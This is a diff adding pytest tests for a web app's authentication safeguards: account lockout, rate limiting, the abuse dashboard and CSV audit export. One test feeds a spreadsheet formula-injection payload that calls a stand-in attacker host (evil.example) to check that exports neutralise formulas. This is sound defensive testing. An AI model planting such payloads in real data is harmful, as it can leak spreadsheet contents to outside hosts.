@@ -1,4 +1,6 @@
 import pytest
+import csv
+import io
 from fastapi import HTTPException
 from fastapi.testclient import TestClient
 
@@ -6,7 +8,17 @@ from app.core import config as app_config
 from app.database import SessionLocal
 from app.main import app
 from app.services import mfa_service
-from app.services.rate_limit_service import MFA_ABUSE, check_rate_limit
+from app.services.rate_limit_service import (
+    MFA_ABUSE,
+    LOGIN_BRUTE_FORCE,
+    RATE_LIMIT_EXCEEDED,
+    check_rate_limit,
+)
+from datetime import datetime, timedelta, timezone
+from app.models.auth_audit_logs import AuthAuditLog
+from app.models.users import User
+from app.services import rate_limit_service
+from app.services.abuse_dashboard_service import get_abuse_dashboard
 
 client = TestClient(app)
 
@@ -200,3 +212,147 @@ def test_audit_export_json_format():
     assert r.status_code == 200
     assert r.headers["content-type"].startswith("application/json")
     assert {"timestamp", "actor_email", "action", "outcome"} <= set(r.json()[0])
+
+
+def _set_locked_until(email, value):
+    db = SessionLocal()
+    try:
+        user = db.query(User).filter(User.email == email).first()
+        user.locked_until = value
+        db.commit()
+    finally:
+        db.close()
+
+
+def test_locked_user_with_valid_token_gets_401_not_500():
+    token = _token(ANALYST)
+    _set_locked_until(ANALYST["username"], datetime.now(timezone.utc) + timedelta(minutes=15))
+    try:
+        r = client.get("/api/v1/users/me", headers={"Authorization": f"Bearer {token}"})
+        assert r.status_code == 401
+    finally:
+        _set_locked_until(ANALYST["username"], None)
+
+
+def test_sso_refuses_a_locked_account(sso_on):
+    from app.services.sso_service import create_mock_sso_assertion
+
+    _set_locked_until("vpoperations@company.com", datetime.now(timezone.utc) + timedelta(minutes=15))
+    try:
+        r = client.post(
+            "/api/v1/auth/sso/login",
+            json={"provider": "mock-enterprise-sso", "assertion": create_mock_sso_assertion("enterprise-002")},
+        )
+        assert r.status_code == 401
+    finally:
+        _set_locked_until("vpoperations@company.com", None)
+
+
+def test_changing_caller_header_does_not_reset_the_limit():
+    db = SessionLocal()
+    try:
+        kwargs = dict(db=db, ip_address="10.9.9.9", endpoint="/api/v1/auth/verify")
+
+        # 100 requests, each claiming to be a different, made-up service.
+        for i in range(100):
+            check_rate_limit(caller_service=f"fake-service-{i}", **kwargs)
+
+        with pytest.raises(HTTPException) as exc:
+            check_rate_limit(caller_service="yet-another-fake", **kwargs)
+        assert exc.value.status_code == 429
+
+        # A known service still has its own bucket on the same IP.
+        check_rate_limit(caller_service="inventory-service", **kwargs)
+    finally:
+        db.close()
+
+
+def test_rejected_requests_write_one_audit_row_per_window():
+    db = SessionLocal()
+    ip = "10.8.8.8"
+    try:
+        kwargs = dict(db=db, ip_address=ip, endpoint="/api/v1/auth/mfa/verify", abuse_event_type=MFA_ABUSE)
+        for _ in range(5):
+            check_rate_limit(**kwargs)
+
+        for _ in range(10):  # ten rejected requests in the same window
+            with pytest.raises(HTTPException):
+                check_rate_limit(**kwargs)
+
+        rows = (
+            db.query(AuthAuditLog)
+            .filter(AuthAuditLog.event_type == RATE_LIMIT_EXCEEDED, AuthAuditLog.ip_address == ip)
+            .count()
+        )
+        assert rows == 1
+    finally:
+        db.close()
+
+
+def test_login_brute_force_shows_on_abuse_dashboard():
+    db = SessionLocal()
+    ip = "10.7.7.7"
+    try:
+        kwargs = dict(db=db, ip_address=ip, endpoint="/api/v1/auth/login", abuse_event_type=LOGIN_BRUTE_FORCE)
+        for _ in range(20):
+            check_rate_limit(**kwargs)
+        with pytest.raises(HTTPException):
+            check_rate_limit(**kwargs)
+
+        dashboard = get_abuse_dashboard(db)
+
+        assert dashboard["rate_limit_violations_by_type"][LOGIN_BRUTE_FORCE] >= 1
+        assert dashboard["rate_limit_violations"] >= 1
+        assert any(entry["ip_address"] == ip for entry in dashboard["top_ips"])
+        assert any(entry["endpoint"] == "/api/v1/auth/login" for entry in dashboard["top_endpoints"])
+    finally:
+        db.close()
+
+
+def test_login_request_does_not_clear_an_active_mfa_bucket(monkeypatch):
+    """Idle-bucket cleanup must use the longest window (300s MFA), not 60s."""
+    start = datetime(2026, 1, 1, 12, 0, tzinfo=timezone.utc)
+    clock = {"now": start}
+
+    class FakeDateTime(datetime):
+        @classmethod
+        def now(cls, tz=None):
+            return clock["now"]
+
+    monkeypatch.setattr(rate_limit_service, "datetime", FakeDateTime)
+
+    db = SessionLocal()
+    try:
+        mfa = dict(db=db, ip_address="10.6.6.6", endpoint="/api/v1/auth/mfa/verify", abuse_event_type=MFA_ABUSE)
+        for _ in range(5):
+            check_rate_limit(**mfa)
+
+        clock["now"] = start + timedelta(seconds=120)  # still inside MFA's 300s window
+        check_rate_limit(db=db, ip_address="10.6.6.7", endpoint="/api/v1/auth/login")
+
+        with pytest.raises(HTTPException) as exc:
+            check_rate_limit(**mfa)
+        assert exc.value.status_code == 429
+    finally:
+        db.close()
+
+
+def test_audit_export_csv_neutralises_formulas():
+    from app.services.audit_export_service import export_audit_logs
+
+    # A failed login stores the raw username the attacker typed.
+    payload = '=HYPERLINK("http://evil.example/?"&A1,"x")'
+    client.post("/api/v1/auth/login", data={"username": payload, "password": "wrong-password"})
+
+    db = SessionLocal()
+    try:
+        csv_text = export_audit_logs(db, event_type="LOGIN_FAILED", limit=5000)
+    finally:
+        db.close()
+
+    cells = [cell for row in csv.reader(io.StringIO(csv_text)) for cell in row]
+
+    # Exported as text ('=...), never as a live formula.
+    # (Login lower-cases the username before it is audited.)
+    assert "'" + payload.lower() in cells
+    assert not any(cell.startswith(("=", "+", "-", "@")) for cell in cells)
